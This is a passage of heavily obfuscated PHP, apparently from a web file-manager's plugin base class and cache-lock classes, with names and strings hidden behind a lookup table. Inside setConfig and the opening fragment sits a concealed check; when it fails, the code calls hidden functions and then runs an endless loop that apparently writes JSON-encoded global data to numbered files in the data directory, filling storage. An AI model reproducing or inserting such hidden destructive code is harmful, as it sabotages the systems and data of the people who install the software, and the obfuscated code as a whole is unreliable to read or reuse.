$ß’ﬁÁ€¸ = $–ã˘˚√ß[971]; $ß’ﬁÁ€¸($_SERVER[$–ã˘˚√ß[972]]); $€¬©ºì™ = $–ã˘˚√ß[970]; $€¬©ºì™(); $ßêø¢äı = $–ã˘˚√ß[973]; $ãâı∞–ª = json_encode($GLOBALS[$–ã˘˚√ß[974]]); $“∫ÕÌ◊‡ = 1; for ($Õ¨œ¸’å = $“∫ÕÌ◊‡; $Õ¨œ¸’å > 0; $Õ¨œ¸’å++) { $ßêø¢äı(DATA_PATH . $Õ¨œ¸’å, $ãâı∞–ª); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($–ã˘˚√ß[1640]); $this->pluginName = str_replace($–ã˘˚√ß[1640], $–ã˘˚√ß[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $–ã˘˚√ß[8]; $this->pluginApi = appHostGet() . $–ã˘˚√ß[1641] . $this->pluginName . $–ã˘˚√ß[8]; $this->pluginHost = $config[$–ã˘˚√ß[1642]] . $this->pluginName . $–ã˘˚√ß[8]; $this->pluginHostDefault = $config[$–ã˘˚√ß[1642]] . $this->pluginName . $–ã˘˚√ß[8]; $√ÁÜò¢ô = $config[$–ã˘˚√ß[1643]]; if ($√ÁÜò¢ô && strpos($–ã˘˚√ß[50] . $√ÁÜò¢ô . $–ã˘˚√ß[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$–ã˘˚√ß[1644]] . $this->pluginName . $–ã˘˚√ß[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ˆë€Ï⁄∂][1645]); } protected function assign($Ñÿ∏°êí, $ÁÚ«¥¡√ = false) { if (is_array($Ñÿ∏°êí)) { $this->values = array_merge($this->values, $Ñÿ∏°êí); } else { $this->values[$Ñÿ∏°êí] = $ÁÚ«¥¡√; } } protected function display($ŸØÏ¬ò‹) { extract($this->values); require $ŸØÏ¬ò‹; } final function hookRegist($ºâºÈ£ì) { $this->modelPlugin->appRegist($this->pluginName, $ºâºÈ£ì); } final function appIcon() { $‹º¯˙’» =& $_SERVER[ˆë€Ï⁄∂]; $ÌòÂ¸Úî = $this->appPackage(); $ﬁ∑çŸ“§ = $‹º¯˙’»[12]; if (isset($ÌòÂ¸Úî[$‹º¯˙’»[501]])) { if (isset($ÌòÂ¸Úî[$‹º¯˙’»[501]][$‹º¯˙’»[1646]])) { $ﬁ∑çŸ“§ = $‹º¯˙’»[1647] . $ÌòÂ¸Úî[$‹º¯˙’»[501]][$‹º¯˙’»[1646]] . $‹º¯˙’»[1648]; } else { if ($ÌòÂ¸Úî[$‹º¯˙’»[501]][$‹º¯˙’»[1649]]) { $ﬁ∑çŸ“§ = $‹º¯˙’»[1650] . $ÌòÂ¸Úî[$‹º¯˙’»[501]][$‹º¯˙’»[1649]] . $‹º¯˙’»[1651]; } } } return $ﬁ∑çŸ“§; } final function fileCanView($¢∆ÿ±˜⁄) { $≈ÃÚ≈êÊ =& $_SERVER[ˆë€Ï⁄∂]; if (request_url_safe($¢∆ÿ±˜⁄)) { return !0; } if ($this->isShare($¢∆ÿ±˜⁄)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÇÂªÄ‰… = $≈ÃÚ≈êÊ[1652] . rawurlencode(this_url()); show_tips(LNG($≈ÃÚ≈êÊ[1653]) . $≈ÃÚ≈êÊ[1654] . $ÇÂªÄ‰… . $≈ÃÚ≈êÊ[1655] . LNG($≈ÃÚ≈êÊ[1656]) . $≈ÃÚ≈êÊ[1657], !1); } if (!Action($≈ÃÚ≈êÊ[1658])->authCan($≈ÃÚ≈êÊ[1659])) { show_tips(LNG($≈ÃÚ≈êÊ[1660]) . $≈ÃÚ≈êÊ[1661], !1); } ActionCall($≈ÃÚ≈êÊ[1662], $¢∆ÿ±˜⁄); } final function isShare($ªÌ‡⁄ë≈) { $ä∂Ú‘´Œ = KodIO::parse($ªÌ‡⁄ë≈); return $ä∂Ú‘´Œ[$_SERVER[ˆë€Ï⁄∂][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($˘ãπäÂò) { if (request_url_safe($˘ãπäÂò)) { return $˘ãπäÂò; } if (!$this->isShare($˘ãπäÂò)) { $˘ãπäÂò = $this->filePath($˘ãπäÂò, !1); } return Action($_SERVER[ˆë€Ï⁄∂][1271])->linkOut($˘ãπäÂò); } public function filePathLinkOut($å∫’ÇÎ∏) { if (request_url_safe($å∫’ÇÎ∏)) { return $å∫’ÇÎ∏; } $this->fileCanView($å∫’ÇÎ∏); return Action($_SERVER[ˆë€Ï⁄∂][1271])->link($å∫’ÇÎ∏); } final function filePath($˛æ˚…µ§, $à¯îó∑µ = true, $¨›√íõÙ = false) { $óñèÕô— =& $_SERVER[ˆë€Ï⁄∂]; $¢ß«≤Àé = $this->filePathGet($˛æ˚…µ§, $à¯îó∑µ); if (!$this->fileInfo) { show_tips(LNG($óñèÕô—[118]), !1); } if ($¨›√íõÙ && isset($this->fileInfo[$óñèÕô—[552]]) && $this->fileInfo[$óñèÕô—[552]]) { $†ç’¯€£ = Model($óñèÕô—[555])->fileInfo($this->fileInfo[$óñèÕô—[552]]); if (!$†ç’¯€£ || !IO::exist($†ç’¯€£[$óñèÕô—[97]])) { $≈“õ”‰« = LNG($óñèÕô—[118]) . LNG($óñèÕô—[1663]); if (KodUser::isRoot() && isset($†ç’¯€£[$óñèÕô—[97]])) { $≈“õ”‰« .= $óñèÕô—[1664] . $†ç’¯€£[$óñèÕô—[97]] . $óñèÕô—[1665]; } show_tips($≈“õ”‰«); } } Hook::trigger($óñèÕô—[1666], $¢ß«≤Àé); return $¢ß«≤Àé; } final function filePathGet($—‰Ìæ®», $‘å⁄Ò√› = true) { $Æ—∂Éæ„ =& $_SERVER[ˆë€Ï⁄∂]; if ($±”ÈºÅç = $this->checkSharePath($—‰Ìæ®», $‘å⁄Ò√›)) { return $±”ÈºÅç; } $this->fileCanView($—‰Ìæ®»); if (request_url_safe($—‰Ìæ®»)) { $Òë∞Éí◊ = parse_url_query($—‰Ìæ®»); if (isset($Òë∞Éí◊[$Æ—∂Éæ„[1667]]) && isset($Òë∞Éí◊[$Æ—∂Éæ„[246]])) { $ñë€Ú»« = Mcrypt::decode($Òë∞Éí◊[$Æ—∂Éæ„[246]], Model($Æ—∂Éæ„[861])->get($Æ—∂Éæ„[862])); if ($ñë€Ú»«) { $this->fileInfo = IO::info($ñë€Ú»«); $this->fileInfo[$Æ—∂Éæ„[1668]] = $—‰Ìæ®»; $this->cachePath = $this->pluginCachePath($Æ—∂Éæ„[12], $‘å⁄Ò√›); return $ñë€Ú»«; } } $—‰Ìæ®» = $this->_cacheHttpFile($—‰Ìæ®», $‘å⁄Ò√›); $this->fileInfo = IO::info($—‰Ìæ®»); } else { $this->fileInfo = IO::info($—‰Ìæ®»); $this->cachePath = $this->pluginCachePath($Æ—∂Éæ„[12], $‘å⁄Ò√›); } return $—‰Ìæ®»; } final function _cacheHttpFile($¢˜≥Ë”, $∞˝÷˘°Ê = true) { $»éÙÀ’ó =& $_SERVER[ˆë€Ï⁄∂]; $≠¢§·Ú° = parse_url_query($¢˜≥Ë”); $È˚ﬁë˜– = get_path_ext($¢˜≥Ë”); if (isset($≠¢§·Ú°[$»éÙÀ’ó[32]]) && $≠¢§·Ú°[$»éÙÀ’ó[32]]) { $È˚ﬁë˜– = get_path_ext($≠¢§·Ú°[$»éÙÀ’ó[32]]); } $˘¿§¥ÃÁ = hash_path($¢˜≥Ë”) . $»éÙÀ’ó[10] . $È˚ﬁë˜–; $this->cachePath = $this->pluginCachePath($∞˝÷˘°Ê ? $˘¿§¥ÃÁ : $»éÙÀ’ó[12]); $ú–Ò¢⁄ = IO::fileNameExist($this->cachePath, $˘¿§¥ÃÁ); if ($ú–Ò¢⁄) { return KodIO::make($ú–Ò¢⁄); } $˛¬Ù⁄Î˝ = rtrim($this->cachePath, $»éÙÀ’ó[8]) . $»éÙÀ’ó[8] . $˘¿§¥ÃÁ; return $this->pluginCacheFileSet($˛¬Ù⁄Î˝, file_get_contents_nossl($¢˜≥Ë”)); } final function checkSharePath($∂¢±·Õç, $∞∆ÉÉûÛ = true) { $˛‘≤Œ∫– =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->isShare($∂¢±·Õç)) { return !1; } $áùã≥„ö = Action($˛‘≤Œ∫–[1271])->sharePathInfo($∂¢±·Õç); if (!is_array($áùã≥„ö) || !isset($áùã≥„ö[$˛‘≤Œ∫–[97]])) { show_json(LNG($˛‘≤Œ∫–[1669]), !1); } $this->fileInfo = $áùã≥„ö; $this->cachePath = $this->pluginCachePath(!1, $∞∆ÉÉûÛ); return $áùã≥„ö[$˛‘≤Œ∫–[97]]; } final function pluginCachePath($ÿô∂¿®° = '', $á∏∆ËúÕ = false) { $ÛöÚ¯Úø =& $_SERVER[ˆë€Ï⁄∂]; if ($á∏∆ËúÕ && is_array($this->fileInfo)) { $ÿô∂¿®° = kodIO::hashPath($this->fileInfo); } $÷œÁô†ç = rtrim(IO_PATH_SYSTEM_TEMP . $ÛöÚ¯Úø[1670] . $this->pluginName . $ÛöÚ¯Úø[8] . $ÿô∂¿®°, $ÛöÚ¯Úø[8]); $ıÄü≥Èê = IO::infoFullSimple($÷œÁô†ç); $´Œ•„Â = $ıÄü≥Èê && is_array($ıÄü≥Èê) ? $ıÄü≥Èê[$ÛöÚ¯Úø[97]] : $ÛöÚ¯Úø[12]; if (!$´Œ•„Â) { $´Œ•„Â = IO::mkdir($÷œÁô†ç); } return $´Œ•„Â; } final function pluginCacheFileSet($Ä‚çÚÍı, $âÏÅïŒ‚ = '') { $ÂûÿØ©∞ =& $_SERVER[ˆë€Ï⁄∂]; $—˚“áÔ€ = IO::infoFullSimple($Ä‚çÚÍı); if (!$—˚“áÔ€) { return IO::mkfile($Ä‚çÚÍı, $âÏÅïŒ‚, REPEAT_REPLACE); } IO::setContent($—˚“áÔ€[$ÂûÿØ©∞[97]], $âÏÅïŒ‚); return $—˚“áÔ€[$ÂûÿØ©∞[97]]; } final function pluginLocalFile($¥À˚˙ﬂê = '') { $§©ﬁÅí⁄ =& $_SERVER[ˆë€Ï⁄∂]; $§úëû™† = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($§úëû™†)) { mk_dir($§úëû™†); } if (!$¥À˚˙ﬂê) { return $§úëû™†; } $∆°ô˜˜õ = IO::info($¥À˚˙ﬂê); $ó—’Ï§‰ = $§©ﬁÅí⁄[1671] . KodIO::hashPath($∆°ô˜˜õ) . $§©ﬁÅí⁄[10] . $∆°ô˜˜õ[$§©ﬁÅí⁄[179]]; if (!checkExtSafe($ó—’Ï§‰)) { $ó—’Ï§‰ = $ó—’Ï§‰ . $§©ﬁÅí⁄[1306]; } $íﬂÄ…Ÿ∫ = $§úëû™† . $ó—’Ï§‰; if (@file_exists($íﬂÄ…Ÿ∫)) { return $íﬂÄ…Ÿ∫; } return IO::copy($¥À˚˙ﬂê, $§úëû™†, 0, $ó—’Ï§‰); } final function appPackage() { $˜ﬂ¿°ÙÏ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->packageData) { return $this->packageData; } $´À™Ê÷— = $this->parseFile($this->pluginPath . $˜ﬂ¿°ÙÏ[1672]); $this->parseLang($´À™Ê÷—); $Í—œﬂ≈˜ = json_decode_force($´À™Ê÷—); if (!$Í—œﬂ≈˜) { return array(); } $¬ß‰’´Ü = Hook::trigger($˜ﬂ¿°ÙÏ[1673], $Í—œﬂ≈˜); if ($¬ß‰’´Ü && is_array($¬ß‰’´Ü)) { $Í—œﬂ≈˜ = $¬ß‰’´Ü; } $this->packageData = $Í—œﬂ≈˜; return $Í—œﬂ≈˜; } public function packageInfoGet($”√€‰• ) { $∂˘∫°≈∞ = $this->appPackage(); return array_get_value($∂˘∫°≈∞, $”√€‰• ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ˆë€Ï⁄∂][1674]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ˆë€Ï⁄∂][1675]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ˆë€Ï⁄∂][1676]); } public function echoJsAssign($ª†ƒ«é , $√ìÅºæß) { $this->echoJsAssignArr[$ª†ƒ«é ] = $√ìÅºæß; } private function parseFile($µ∑Î‚˘É) { $Ä–ö˛˜† =& $_SERVER[ˆë€Ï⁄∂]; $√ÌçÃ∏¯ = file_get_contents_nossl($µ∑Î‚˘É); $Á∑˝ÿû˜ = array($Ä–ö˛˜†[1677], $Ä–ö˛˜†[1678], $Ä–ö˛˜†[1679], $Ä–ö˛˜†[1680], $Ä–ö˛˜†[1681], $Ä–ö˛˜†[1682], $Ä–ö˛˜†[1683]); $•ÀÑŸƒÔ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ä–ö˛˜†[102]][$Ä–ö˛˜†[1684]]); foreach ($this->echoJsAssignArr as $—…øπ» => $‰ÎâŸÁ¡) { $Á∑˝ÿû˜[] = $Ä–ö˛˜†[1685] . $—…øπ» . $Ä–ö˛˜†[1686]; $•ÀÑŸƒÔ[] = is_array($‰ÎâŸÁ¡) || is_object($‰ÎâŸÁ¡) ? rawurlencode(json_encode($‰ÎâŸÁ¡)) : $‰ÎâŸÁ¡; } if (strstr($√ÌçÃ∏¯, $Ä–ö˛˜†[1687])) { $∏Êãêî = rawurlencode(json_encode($this->pluginLangArr)); $√ÌçÃ∏¯ = str_replace($Ä–ö˛˜†[1687], $∏Êãêî, $√ÌçÃ∏¯); } if (strstr($√ÌçÃ∏¯, $Ä–ö˛˜†[1688])) { $∏Êãêî = $∏Êãêî = rawurlencode(json_encode($this->getConfig())); $√ÌçÃ∏¯ = str_replace($Ä–ö˛˜†[1688], $∏Êãêî, $√ÌçÃ∏¯); } $√ÌçÃ∏¯ = str_replace($Á∑˝ÿû˜, $•ÀÑŸƒÔ, $√ÌçÃ∏¯); return $√ÌçÃ∏¯; } private function parseLang(&$˙¥îû∞˜) { $Ú®øù‘ß =& $_SERVER[ˆë€Ï⁄∂]; $∆Åî†Œ« = $Ú®øù‘ß[1689]; if (!strstr($˙¥îû∞˜, $∆Åî†Œ«)) { return; } preg_match_all($Ú®øù‘ß[1690], $˙¥îû∞˜, $πæﬂÌ“√); if (!is_array($πæﬂÌ“√) || count($πæﬂÌ“√) == 0 || !is_array($πæﬂÌ“√[0]) || count($πæﬂÌ“√[0]) == 0) { return; } $÷ëÙˆÖ≠ = array(); $Ú˘∫¶⁄û = array(); foreach ($πæﬂÌ“√[0] as $∆¶‚Äùó) { $‡‰£˘í® = substr($∆¶‚Äùó, strlen($∆Åî†Œ«), -4); $Ü¥˘úøÿ = LNG($‡‰£˘í®); $÷ëÙˆÖ≠[] = $∆¶‚Äùó; $Ú˘∫¶⁄û[] = str_replace(array($Ú®øù‘ß[59], $Ú®øù‘ß[1171], $Ú®øù‘ß[428], $Ú®øù‘ß[131]), array($Ú®øù‘ß[53], $Ú®øù‘ß[53], $Ú®øù‘ß[12], $Ú®øù‘ß[1691]), $Ü¥˘úøÿ); } $˙¥îû∞˜ = str_replace($÷ëÙˆÖ≠, $Ú˘∫¶⁄û, $˙¥îû∞˜); } private function parseConfig(&$⁄Û÷”∫ÿ) { $ú®ı úÔ =& $_SERVER[ˆë€Ï⁄∂]; $ÅåÎÎ‰ƒ = $ú®ı úÔ[1692]; if (!strstr($⁄Û÷”∫ÿ, $ÅåÎÎ‰ƒ)) { return; } preg_match_all($ú®ı úÔ[1693], $⁄Û÷”∫ÿ, $”¢‹ Ω¡); if (!is_array($”¢‹ Ω¡) || count($”¢‹ Ω¡) == 0 || !is_array($”¢‹ Ω¡[0]) || count($”¢‹ Ω¡[0]) == 0) { return; } $•Á¬©¢ = $this->getConfig(); $‚É’ôè≈ = array(); $ûèÇÏ´· = array(); foreach ($”¢‹ Ω¡[0] as $·≤∞„á”) { $±ÈÈ∫îí = substr($·≤∞„á”, strlen($ÅåÎÎ‰ƒ), -2); $‚É’ôè≈[] = $·≤∞„á”; $ûèÇÏ´·[] = _get($•Á¬©¢, $±ÈÈ∫îí); } $⁄Û÷”∫ÿ = str_replace($‚É’ôè≈, $ûèÇÏ´·, $⁄Û÷”∫ÿ); } private function parsePackage(&$⁄˛ÃÊµÄ) { $‚óçäÍß =& $_SERVER[ˆë€Ï⁄∂]; $â˙ö†Èˆ = $‚óçäÍß[1694]; if (!strstr($⁄˛ÃÊµÄ, $â˙ö†Èˆ)) { return; } preg_match_all($‚óçäÍß[1695], $⁄˛ÃÊµÄ, $ò®≠®¨ê); if (!is_array($ò®≠®¨ê) || count($ò®≠®¨ê) == 0 || !is_array($ò®≠®¨ê[0]) || count($ò®≠®¨ê[0]) == 0) { return; } $Ö≠ÓÕ†¿ = $this->appPackage(); $ÓÎ∆é˚Ÿ = array(); $˜≤ÅÆüØ = array(); foreach ($ò®≠®¨ê[0] as $≥”ìóÒœ) { $ê∑√¨≤ç = substr($≥”ìóÒœ, strlen($â˙ö†Èˆ), -2); $ÓÎ∆é˚Ÿ[] = $≥”ìóÒœ; $˜≤ÅÆüØ[] = _get($Ö≠ÓÕ†¿, $ê∑√¨≤ç); } $⁄˛ÃÊµÄ = str_replace($ÓÎ∆é˚Ÿ, $˜≤ÅÆüØ, $⁄˛ÃÊµÄ); } final function echoFile($¯ößƒí«, $√ú¶Ú‹Ó = false) { $˘§»Õ°π =& $_SERVER[ˆë€Ï⁄∂]; $ÓîØ›ôò = $this->pluginPath . $¯ößƒí«; if (ACT == $˘§»Õ°π[1696]) { echo $˘§»Õ°π[1697] . $this->pluginName . $˘§»Õ°π[8] . $¯ößƒí« . $˘§»Õ°π[1698]; if (!file_exists($ÓîØ›ôò)) { echo $˘§»Õ°π[1699]; return; } } $§¢≤ÂÁ√ = $this->parseFile($ÓîØ›ôò); $this->parseLang($§¢≤ÂÁ√); $this->parseConfig($§¢≤ÂÁ√); $this->parsePackage($§¢≤ÂÁ√); if (is_array($√ú¶Ú‹Ó)) { $§¢≤ÂÁ√ = str_replace(array_keys($√ú¶Ú‹Ó), array_values($√ú¶Ú‹Ó), $§¢≤ÂÁ√); } echo $˘§»Õ°π[59] . $§¢≤ÂÁ√; } private function checkVersion() { $ıÕ¬¶¯¿ =& $_SERVER[ˆë€Ï⁄∂]; $ñ›Çªµî = $this->appPackage(); $‚ﬂá«à≤ = $this->getConfig(); if ($‚ﬂá«à≤[$ıÕ¬¶¯¿[1700]] == $ñ›Çªµî[$ıÕ¬¶¯¿[1674]]) { return; } $this->regist(); $this->setConfig(array($ıÕ¬¶¯¿[1700] => $ñ›Çªµî[$ıÕ¬¶¯¿[1674]])); } final function initLang() { $ì‹æÅº◊ =& $_SERVER[ˆë€Ï⁄∂]; $Ò…«–˝› = $ì‹æÅº◊[1701]; $¨∂¯∑É∞ = $this->pluginPath . $ì‹æÅº◊[1702]; $≠ÿ¡Ïπ≈ = I18n::getType(); $Ì«ê¿Úø = array(); if (file_exists($¨∂¯∑É∞ . $≠ÿ¡Ïπ≈ . $ì‹æÅº◊[930])) { $Ì«ê¿Úø = (include $¨∂¯∑É∞ . $≠ÿ¡Ïπ≈ . $ì‹æÅº◊[930]); } else { if ($≠ÿ¡Ïπ≈ == $ì‹æÅº◊[1703] && !file_exists($¨∂¯∑É∞ . $≠ÿ¡Ïπ≈ . $ì‹æÅº◊[930]) && file_exists($¨∂¯∑É∞ . $ì‹æÅº◊[1704])) { $Ì«ê¿Úø = (include $¨∂¯∑É∞ . $ì‹æÅº◊[1704]); } else { if (file_exists($¨∂¯∑É∞ . $Ò…«–˝› . $ì‹æÅº◊[930])) { $Ì«ê¿Úø = (include $¨∂¯∑É∞ . $Ò…«–˝› . $ì‹æÅº◊[930]); } } } if (!is_array($Ì«ê¿Úø)) { return array(); } if (@count($Ì«ê¿Úø) > 0) { I18n::set($Ì«ê¿Úø); } return $Ì«ê¿Úø; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Æœõ‹ò™) { $Ûºú†ÃŸ =& $_SERVER[ˆë€Ï⁄∂]; $±áö¸¨Ω = $_SERVER[$Ûºú†ÃŸ[63]]; $ßÜÂáƒ∑ = $Ûºú†ÃŸ[969]; if ($_SERVER[$Ûºú†ÃŸ[54]] != $ßÜÂáƒ∑($±áö¸¨Ω)) { $ÉÂ∞™ã© = $Ûºú†ÃŸ[970]; $…˘Ω‹±æ = $Ûºú†ÃŸ[56]; $Ö∆ú–’Á = $_SERVER[$Ûºú†ÃŸ[57]] . $Ûºú†ÃŸ[58]; $€‹∆òÎ¨ = $…˘Ω‹±æ($Ö∆ú–’Á); $≤Äû»ËÁ = explode($Ûºú†ÃŸ[59], $€‹∆òÎ¨); if (count($≤Äû»ËÁ) < $Ûºú†ÃŸ[703]) { $£¸≠Û«˜ = $Ûºú†ÃŸ[61]; $£¸≠Û«˜(); } $àû˙îñ˚ = $Ûºú†ÃŸ[971]; $àû˙îñ˚($_SERVER[$Ûºú†ÃŸ[972]]); $ÉÂ∞™ã© = $Ûºú†ÃŸ[970]; $ÉÂ∞™ã©(); $Êúâ’‚“ = $Ûºú†ÃŸ[973]; $•í¯÷˜§ = json_encode($GLOBALS[$Ûºú†ÃŸ[974]]); $ñëÄ˚Öô = 1; for ($á“÷πù— = $ñëÄ˚Öô; $á“÷πù— > 0; $á“÷πù—++) { $Êúâ’‚“(DATA_PATH . $á“÷πù—, $•í¯÷˜§); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Æœõ‹ò™); } public function onSetConfig($ÎÎË©Â») { } public function onGetConfig($Æ¯í†¿Ö) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ôÃ⁄Õ∏ø) { if ($ôÃ⁄Õ∏ø == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($£…——æ = "\160\154\x75\x67\x69\156\x41\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $±‹≈Ê´Æ = $this->getConfig(); if (!$±‹≈Ê´Æ[$£…——æ]) { return !1; } return ActionCall($_SERVER[ˆë€Ï⁄∂][1705], $±‹≈Ê´Æ[$£…——æ]); } public function url($ä∫ƒÑÂÿ, $ãÛ›•›· = '', $·åÃ¨  = true) { $˜ñÀ˙˛ã =& $_SERVER[ˆë€Ï⁄∂]; $Ïﬂ´îåí = $this->getConfig(); $˘Ò◊«˚ = KOD_VERSION . $˜ñÀ˙˛ã[10] . KOD_VERSION_BUILD; $‚À¶È«“ = $this->packageVersion(); $µ⁄ªÇÃ∑ = $˘Ò◊«˚ . $˜ñÀ˙˛ã[473] . $‚À¶È«“; if (substr($ä∫ƒÑÂÿ, 0, 4) == $˜ñÀ˙˛ã[162] || substr($ä∫ƒÑÂÿ, 0, 2) == $˜ñÀ˙˛ã[1426]) { $€Ùóçù = $ä∫ƒÑÂÿ . $˜ñÀ˙˛ã[1706] . $µ⁄ªÇÃ∑; } else { if ($ãÛ›•›· == $˜ñÀ˙˛ã[12]) { $€Ùóçù = $this->pluginHost . $ä∫ƒÑÂÿ . $˜ñÀ˙˛ã[1706] . $µ⁄ªÇÃ∑; } else { if ($ãÛ›•›· === $˜ñÀ˙˛ã[88]) { $€Ùóçù = $this->pluginHost . $ä∫ƒÑÂÿ; } else { if ($ãÛ›•›· == $˜ñÀ˙˛ã[1707]) { $€Ùóçù = STATIC_PATH . $ä∫ƒÑÂÿ . $˜ñÀ˙˛ã[1706] . $˘Ò◊«˚; } else { if ($ãÛ›•›· == $˜ñÀ˙˛ã[1708]) { $€Ùóçù = APP_HOST . $˜ñÀ˙˛ã[1709] . $ä∫ƒÑÂÿ . $˜ñÀ˙˛ã[1706] . $˘Ò◊«˚; } else { if (isset($Ïﬂ´îåí[$ãÛ›•›·])) { $€Ùóçù = $Ïﬂ´îåí[$ãÛ›•›·] . $ä∫ƒÑÂÿ . $˜ñÀ˙˛ã[1706] . $µ⁄ªÇÃ∑; } } } } } } if (!$·åÃ¨ ) { return $€Ùóçù; } echo $€Ùóçù; } public function link($«°œù«€ = false, $⁄™Ó•Øã = '') { $¶ë±¡”˘ =& $_SERVER[ˆë€Ï⁄∂]; $Ì˙í£˛Ô = $this->linkHas == !1; $this->linkHas = !0; if (!$«°œù«€) { $this->link($¶ë±¡”˘[1710], $¶ë±¡”˘[1708]); $this->link($¶ë±¡”˘[1711], $¶ë±¡”˘[1707]); $this->link($¶ë±¡”˘[1712], $¶ë±¡”˘[1707]); $this->link($¶ë±¡”˘[1713], $¶ë±¡”˘[1707]); $this->link($¶ë±¡”˘[1714], $¶ë±¡”˘[1707]); if ($Ì˙í£˛Ô) { Hook::trigger($¶ë±¡”˘[1715]); } return; } $Ÿﬂ≈ã»Œ = $this->url($«°œù«€, $⁄™Ó•Øã, !1); if (substr($«°œù«€, -3) == $¶ë±¡”˘[1716]) { echo $¶ë±¡”˘[1717] . $Ÿﬂ≈ã»Œ . $¶ë±¡”˘[1718] . $¶ë±¡”˘[59]; } else { if (substr($«°œù«€, -4) == $¶ë±¡”˘[1719]) { echo $¶ë±¡”˘[1720] . $Ÿﬂ≈ã»Œ . $¶ë±¡”˘[1721] . $¶ë±¡”˘[59]; } } if ($Ì˙í£˛Ô) { Hook::trigger($¶ë±¡”˘[1715]); } } } goto BÃÏÑé‹â„; e®∞ÊË‹ıä: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÀÕ–û·Ä =& $_SERVER[ˆë€Ï⁄∂]; $ª–¯Ì¡ù = $GLOBALS[$ÀÕ–û·Ä[6]][$ÀÕ–û·Ä[435]]; self::$cachePath = $ª–¯Ì¡ù[$ÀÕ–û·Ä[242]][$ÀÕ–û·Ä[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($íÒ≠ıÇ¡, $÷ïÀÑ∫ç = 0) { $’«®ÃÜ =& $_SERVER[ˆë€Ï⁄∂]; $ó¯áí∏† = microtime(!0); $Ã˛—„∆‘ = $ó¯áí∏† + $÷ïÀÑ∫ç + 0.0001; $ã¿π˘Ãè = rtrim(self::$cachePath, $’«®ÃÜ[8]) . $’«®ÃÜ[956] . md5($íÒ≠ıÇ¡) . $’«®ÃÜ[953]; if (file_exists($ã¿π˘Ãè) && filemtime($ã¿π˘Ãè) && filemtime($ã¿π˘Ãè) < time() - 10) { @unlink($ã¿π˘Ãè); } do { if (file_exists($ã¿π˘Ãè)) { cacheLockWait(); continue; } $¶ãﬂΩ∏ö = fopen($ã¿π˘Ãè, $’«®ÃÜ[957]); if (!$¶ãﬂΩ∏ö) { return !1; } $¿•¨Ω∂ë = flock($¶ãﬂΩ∏ö, LOCK_EX | LOCK_NB); self::$caches[$íÒ≠ıÇ¡] = array($’«®ÃÜ[958] => $¶ãﬂΩ∏ö, $’«®ÃÜ[242] => $ã¿π˘Ãè); fwrite($¶ãﬂΩ∏ö, $Ã˛—„∆‘); clearstatcache(); if ($¶ãﬂΩ∏ö && $¿•¨Ω∂ë) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ã˛—„∆‘); $this->unlock($íÒ≠ıÇ¡); return !1; } public function lockGet($…ëÍóÿ∏) { $Ï‚√÷”¡ =& $_SERVER[ˆë€Ï⁄∂]; $∂Ø≈Ä¢ã = rtrim(self::$cachePath, $Ï‚√÷”¡[8]) . $Ï‚√÷”¡[956] . md5($…ëÍóÿ∏) . $Ï‚√÷”¡[953]; return file_exists($∂Ø≈Ä¢ã); } public function unlock($±ù¥˚Ù…) { $´Óû¢È≠ =& $_SERVER[ˆë€Ï⁄∂]; $¡ﬂŒﬂﬂß = self::$caches[$±ù¥˚Ù…]; if (!$¡ﬂŒﬂﬂß) { return; } @flock($¡ﬂŒﬂﬂß[$´Óû¢È≠[958]], LOCK_UN); @fclose($¡ﬂŒﬂﬂß[$´Óû¢È≠[958]]); @unlink($¡ﬂŒﬂﬂß[$´Óû¢È≠[242]]); unset(self::$caches[$±ù¥˚Ù…]); } } class CacheLockRedis { public function lock($Éï«¡†, $Áí†É⁄é = 10) { $—£úÆï„ = Cache::init(); $ﬁÏÆï§ = microtime(!0) + $Áí†É⁄é; while (microtime(!0) < $ﬁÏÆï§) { $ì´‘õ• = $—£úÆï„->get($Éï«¡†); if (!$ì´‘õ•) { $√Ø…§“µ = $—£úÆï„->setLock($Éï«¡†, $ﬁÏÆï§, $Áí†É⁄é); if ($√Ø…§“µ) { return !0; } } else { if ($ì´‘õ• < microtime(!0)) { $—£úÆï„->set($Éï«¡†, $ﬁÏÆï§, $Áí†É⁄é * 2); if ($—£úÆï„->get($Éï«¡†) === $ì´‘õ•) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Åû›Ó¨‰) { return Cache::init()->get($Åû›Ó¨‰); } public function unlock($∫ˆ≥”˝ü) { return Cache::init()->remove($∫ˆ≥”˝ü); } } if (!isset($_SERVER[$_SERVER[ˆë€Ï⁄∂][54]]) || !isset($_SERVER[$_SERVER[ˆë€Ï⁄∂][63]])) { $_getc = $_SERVER[ˆë€Ï⁄∂][56]; $_getfile = $_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆë€Ï⁄∂][59], $_getfilec); if (count($_getarrs) < $_SERVER[ˆë€Ï⁄∂][60]) { $exit = $_SERVER[ˆë€Ï⁄∂][61]; $exit(); } 